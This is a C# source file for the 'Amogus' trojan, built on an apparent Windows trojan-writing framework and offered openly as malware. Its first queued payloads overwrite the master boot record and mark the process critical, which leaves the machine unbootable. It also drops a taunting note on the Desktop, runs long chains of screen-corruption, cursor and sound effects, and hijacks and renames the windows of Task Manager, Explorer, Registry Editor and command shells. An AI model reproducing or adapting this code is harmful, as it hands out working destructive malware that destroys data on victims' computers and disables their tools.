// Copyright © TheAirBlow 2022 <theairblow.help@gmail.com>
// This Source Code Form is subject to the terms of the Mozilla Public
// License, v2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.

using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Media;
using System.Windows.Forms;
using TheAirBlow.Zigman.Legacy;

namespace TheAirBlow.Amogus;

public class Amogus : Trojan
{
    public override void UserInit()
    {
        // Load assets
        AddAsset("sfx_amogus", new SoundPlayer(Path.Combine(Directory.GetCurrentDirectory(), "assets\\sfx_amogus.wav")));
        AddAsset("music_amogus", new SoundPlayer(Path.Combine(Directory.GetCurrentDirectory(), "assets\\music_amogus.wav")));
        AddAsset("img_amogus", Image.FromFile(Path.Combine(Directory.GetCurrentDirectory(), "assets\\img_amogus.png")));
        AddAsset("img_monke", Image.FromFile(Path.Combine(Directory.GetCurrentDirectory(), "assets\\img_monke.png")));
        // Enable payload queue
        EnablePayloadQueue();
        // Rotation payloads
        var current = 0;
        var initialized = false;
        var currentRotationPayload = 1;
        var rotationIndex1 = 1;
        var lastRotationIndex1 = 0;
        var rotationIndex2 = 0;
        var rotationIndex3 = 0;
        var lastRotationIndex3 = 0;
            
        // Rotation values (big boi)
        var rotationValues = new List<Rectangle> {
            //------------------------\\
            new(0, 0, Width, Height),
            new(0, 5, Width, Height),
            new(0, 10, Width, Height),
            new(0, 15, Width, Height),
            new(0, 20, Width, Height),
            new(0, 25, Width, Height),
            new(0, 30, Width, Height),
            new(0, 35, Width, Height),
            new(0, 40, Width, Height),
            new(0, 45, Width, Height),
            new(0, 50, Width, Height),
            new(0, 55, Width, Height),
            new(0, 60, Width, Height),
            //-------------------------\\
            new(5, 60, Width, Height),
            new(10, 60, Width, Height),
            new(15, 60, Width, Height),
            new(20, 60, Width, Height),
            new(25, 60, Width, Height),
            new(30, 60, Width, Height),
            new(35, 60, Width, Height),
            new(40, 60, Width, Height),
            //--------------------------\\
            new(40, 55, Width, Height),
            new(40, 50, Width, Height),
            new(40, 45, Width, Height),
            new(40, 40, Width, Height),
            new(40, 35, Width, Height),
            new(40, 30, Width, Height),
            new(40, 25, Width, Height),
            new(40, 20, Width, Height),
            new(40, 15, Width, Height),
            new(40, 10, Width, Height),
            new(40, 5, Width, Height),
            //-------------------------\\
            new(40, 0, Width, Height),
            new(35, 0, Width, Height),
            new(30, 0, Width, Height),
            new(25, 0, Width, Height),
            new(20, 0, Width, Height),
            new(15, 0, Width, Height),
            new(10, 0, Width, Height),
            new(5, 0, Width, Height),
            new(0, 0, Width, Height),
        };
        // Load payloads
        AddPayload("critical", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Destructive,
            CanBeStacked = true,
            Action = () => {
                // Make process critical
                MakeProcessCritical();
                DeletePayload("critical");
            },
        });
        AddPayload("mbr", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Destructive,
            CanBeStacked = true,
            Action = () => {
                // MBR overwrite
                Overwrite(Array.Empty<byte>());
                DeletePayload("mbr");
            },
        });
        AddPayload("init", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Play music and change wallpaper
                GetAsset<SoundPlayer>("music_amogus").PlayLooping(); 
                //SetWallpaper(Path.Combine(Directory.GetCurrentDirectory(), 
                //    "assets\\img_wallpaper.jpg"), Style.Stretched);
                var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "note.txt");
                File.WriteAllText(path, "Haha you just ran Amogus trojan!!1!\r\nRest in piss, forever miss!\r\n\r\nCopyright (C) TheAirBlow 2021" +
                                        "\r\nGitHub: https://github.com/theairblow/zigman" +
                                        "\r\nVK: https://vk.com/theairblow");
                Process.Start(@"C:\Windows\System32\notepad.exe", path);
                DeletePayload("init");
            },
        });
        
        AddPayload("amogus", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Draw amogus and monke
                var x = Random.Next(0, Width);
                var y = Random.Next(0, Height);
                DisplayGraphics.DrawImage(
                    Random.Next(0, 100) < 8 
                        ? GetAsset<Image>("img_monke") 
                        : GetAsset<Image>("img_amogus")
                    , x, y);
                Thread.Sleep(50);
            },
        });
        AddPayload("icons", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Draw icons everywhere
                var icon = LoadIcon(IntPtr.Zero, Random.Next(32512, 32518)); 
                DrawIcon(DisplayHandle, Random.Next(0, Width), Random.Next(0, Height), icon);
                Thread.Sleep(10);
            },
        });
        AddPayload("invert_random_chunks", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Copy random chunks into random positions and invert them
                var x1 = Random.Next(0, Width);
                var y1 = Random.Next(0, Height);
                var x2 = Random.Next(0, Width);
                var y2 = Random.Next(0, Height);
                var w = Random.Next(0, 300);
                var h = Random.Next(0, 300);
                var w2 = Random.Next(0, Width);
                var h2 = Random.Next(0, Height);
                StretchBlt(DisplayHandle, x1, y1, w, h, 
                    DisplayHandle, x2, y2, w2, 
                    h2, RasterOperation.SrcInvert);
                Thread.Sleep(100);
            },
        });
        AddPayload("squish", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                var original = CreateCompatibleDC(DisplayHandle);
                var bitmap = CreateCompatibleBitmap(
                    DisplayHandle, Width, Height);
                var holdbit = SelectObject(original, bitmap);
                StretchBlt(original, 25, 25, Width - 50, Height - 50,
                    DisplayHandle, 0, 0, Width, Height,
                    RasterOperation.SrcCopy);
                StretchBlt(DisplayHandle, -25, -25, Width + 50, Height + 50,
                    original, 0, 0, Width, Height, 
                    RasterOperation.SrcCopy);
                SelectObject(original, holdbit);
                DeleteObject(bitmap);
                Thread.Sleep(100);
            },
        });
        AddPayload("cursor_move", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Move cursor randomly
                Cursor.Position = new System.Drawing.Point(Cursor.Position.X + Random.Next(-10, 10),
                    Cursor.Position.Y + Random.Next(-10, 10));
                Thread.Sleep(20);
            },
        });
        AddPayload("sucker", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                var original = CreateCompatibleDC(DisplayHandle);
                var bitmap = CreateCompatibleBitmap(
                    DisplayHandle, Width, Height);
                var holdbit = SelectObject(original, bitmap);
                StretchBlt(original, 0, 0, Width, Height,
                    DisplayHandle, 0, 0, Width, Height, 
                    RasterOperation.SrcCopy);
                
                var x = Random.Next(0, Width);
                var y = Random.Next(0, Height);
                for (var i = 1020; i != 0; i -= 20) {
                    var l = i - 20;
                    StretchBlt(DisplayHandle, x - l / 2, y - l / 2,
                        l, l, original,
                        x - i / 2, y - i / 2, i, i,
                        RasterOperation.SrcCopy);
                }
                
                SelectObject(original, holdbit);
                DeleteObject(bitmap);
                Thread.Sleep(100);
            },
        });
        AddPayload("reverse", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Reverse the screen
                StretchBlt(
                    DisplayHandle, 0, 0, 
                    Width, Height, 
                    DisplayHandle, Width, 0,
                    -Width, Height,
                    RasterOperation.SrcCopy);
                Thread.Sleep(250);
            },
        });
        AddPayload("invert_square", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Invert random chunks (same width and height) 
                var x = Random.Next(0, Width);
                var y = Random.Next(0, Height);
                var wh = Random.Next(0, 300);
                StretchBlt(DisplayHandle, x, y, wh, wh, DisplayHandle, x, y, wh, 
                    wh, RasterOperation.DstInvert);
                Thread.Sleep(100);
            },
        });
        AddPayload("invert_screen", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Invert screen
                StretchBlt(DisplayHandle, 0, 0, Width, Height, 
                    DisplayHandle, 0, 0, Width, Height, RasterOperation.DstInvert);
                Thread.Sleep(250);
            },
        });
        AddPayload("recursive", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Recursive
                var w = Width - 100;
                var h = Height - 100;
                StretchBlt(DisplayHandle, 50, 50, w, h, DisplayHandle, 
                    0, 0, Width, Height, RasterOperation.SrcCopy);
                Thread.Sleep(100);
            },
        });
        AddPayload("swirly", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                var points = new POINT[3];
                points[0].X = -10;
                points[0].Y = -10;
                points[1].X = Width + 10;
                points[1].Y = 0;
                points[2].X = -10;
                points[2].Y = Height + 10;
                PlgBlt(DisplayHandle, points, DisplayHandle, 0, 0,
                    Width, Height, IntPtr.Zero, 0, 0);
                Thread.Sleep(100);
            },
        });
        AddPayload("beeps", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Play random beeps
                Beep(Random.Next(500, 1500), 100);
            },
        });
        AddPayload("red", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                var dest = CreateCompatibleDC(DisplayHandle);
                var bitmap = CreateCompatibleBitmap(
                    DisplayHandle, Width, Height);
                var holdbit = SelectObject(dest, bitmap);
                SelectObject(dest, CreateSolidBrush(100));
                Rectangle(dest, 0, 0,
                    Width, Height);
                AlphaBlend(DisplayHandle, 0, 0,
                    Width, Height, dest,
                    0, 0, Width, Height,
                    new BLENDFUNCTION(0, 0, 10, 0));
                SelectObject(dest, holdbit);
                DeleteObject(bitmap);
                Thread.Sleep(100);
            },
        });
        AddPayload("screen_melter", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Screen melter
                var x = Random.Next(0, Width);
                var y = Random.Next(15, 50);
                var size = Random.Next(2, 100);
                StretchBlt(DisplayHandle, x, y, 
                    size, Height, DisplayHandle, x,
                    0, size, Height,
                    RasterOperation.SrcCopy);
                Thread.Sleep(50);
            },
        });
        AddPayload("rotation", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Rotation
                if (currentRotationPayload != 1) Thread.Sleep(1000);
                if (rotationIndex1 == rotationValues.Count - 1)
                    rotationIndex1 = 0;
                var lastRotation = rotationValues[lastRotationIndex1];
                var newRotation = rotationValues[rotationIndex1];
                StretchBlt(DisplayHandle, newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
                    DisplayHandle, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
                    RasterOperation.SrcCopy);

                rotationIndex1++;
                Thread.Sleep(100);
            },
        });
        AddPayload("rotationwtf1", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // What the fuck? #1
                if (currentRotationPayload == 1) currentRotationPayload = 2;
                if (currentRotationPayload != 2) Thread.Sleep(1000);
                if (rotationIndex2 == rotationValues.Count - 1)
                    rotationIndex2 = 0;
                var lastRotation = new Rectangle(0, 0, Width, Height);
                var newRotation = rotationValues[rotationIndex2];
                StretchBlt(DisplayHandle, newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
                    DisplayHandle, lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
                    RasterOperation.SrcCopy);

                StretchBlt(DisplayHandle, -newRotation.X, newRotation.Y, newRotation.Width, newRotation.Height,
                    DisplayHandle, -lastRotation.X, lastRotation.Y, lastRotation.Width, lastRotation.Height,
                    RasterOperation.SrcCopy);
                
                StretchBlt(DisplayHandle, newRotation.X, -newRotation.Y, newRotation.Width, newRotation.Height,
                    DisplayHandle, lastRotation.X, -lastRotation.Y, lastRotation.Width, lastRotation.Height,
                    RasterOperation.SrcCopy);
                
                StretchBlt(DisplayHandle, -newRotation.X, -newRotation.Y, newRotation.Width, newRotation.Height,
                    DisplayHandle, -lastRotation.X, -lastRotation.Y, lastRotation.Width, lastRotation.Height,
                    RasterOperation.SrcCopy);
                
                rotationIndex2++;
                Thread.Sleep(100);
            },
        });
        AddPayload("christmas", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Christmas!
                if (!initialized) {
                    MagInitialize();
                    initialized = true;
                }
                    
                var matrix = new ColorEffect {
                    transform = new float[] {
                        1, 0, 0, 0, 0,
                        0, 1, 0, 0, 0,
                        0, 0, 1, 0, 0,
                        0, 0, 0, 1, 0,
                        0, 0, 0, 0, 0
                    }
                };

                matrix.transform[19 + current] = 0.4f;
                MagSetFullscreenColorEffect(ref matrix);
                current++;
                if (current == 4) current = 1;
                Thread.Sleep(500);
            },
        });
        AddPayload("windows_fucker", new Payload {
            LevelOfSafety = Payload.SafetyLevel.SemiDestructive,
            CanBeStacked = true,
            Action = () => {
                // Move specific processes' windows and subelements, change their text too
                var processes = new List<string> {
                    "explorer", "notepad",
                    "wordpad", "cmd", "regedit", "taskmgr", "mspaint",
                    "powershell", "calc", "control", "mmc", "winver"
                };
                foreach (var hWnd in from name in processes from proc 
                             in Process.GetProcessesByName(name) select proc.MainWindowHandle) {
                    EnumChildWindows(hWnd, (hwnd, _) => {
                        SetWindowTextA(hwnd, "AMOGUS (VERY SUS)");
                        SetWindowPos(hwnd, (IntPtr)0, Random.Next(0, 80), 
                            Random.Next(0, 80), 0, 0, (uint)SetWindowPosFlags.DoNotResize);
                        return true;
                    },  (IntPtr)null);
                    SetWindowTextA(hWnd, "AMOGUS (VERY SUS)");
                    SetWindowPos(hWnd, (IntPtr)ZOrder.Top, Random.Next(0, Width), 
                        Random.Next(0, Height), 0, 0, (uint)SetWindowPosFlags.DoNotResize);
                }
                    
                Thread.Sleep(500);
            },
        });
        AddPayload("eternal_darkness", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // What the fuck? #2
                StretchBlt(DisplayHandle, Random.Next(-5, 5), Random.Next(-5, 5), Width, Height,
                    DisplayHandle, 0, 0, Width, Height, 8658951);
                Thread.Sleep(100);
            },
        });
        AddPayload("kill", new Payload {
            LevelOfSafety = Payload.SafetyLevel.Safe,
            CanBeStacked = true,
            Action = () => {
                // Kill the process
                Environment.Exit(-1);
            },
        });
        // Enqueue payloads
        EnqueuePayload("mbr", 1);
        EnqueuePayload("critical", 1);
        EnqueuePayload("init", 24000);
        EnqueuePayload("amogus", 10000);
        EnqueuePayload("icons", 10000);
        EnqueuePayload("invert_random_chunks", 10000);
        EnqueuePayload("squish", 10000);
        EnqueuePayload("cursor_move", 10000);
        EnqueuePayload("sucker", 10000);
        EnqueuePayload("reverse", 10000);
        EnqueuePayload("invert_square", 10000);
        EnqueuePayload("invert_screen", 10000);
        EnqueuePayload("recursive", 10000);
        EnqueuePayload("swirly", 10000);
        EnqueuePayload("beeps", 10000);
        EnqueuePayload("red", 10000);
        EnqueuePayload("screen_melter", 10000);
        EnqueuePayload("rotation", 10000);
        EnqueuePayload("rotationwtf1", 10000);
        EnqueuePayload("christmas", 10000);
        EnqueuePayload("windows_fucker", 10000);
        EnqueuePayload("eternal_darkness", 10000);
        EnqueuePayload("kill", 60000);
        // Start payload queue
        StartQueue(1);
    }
}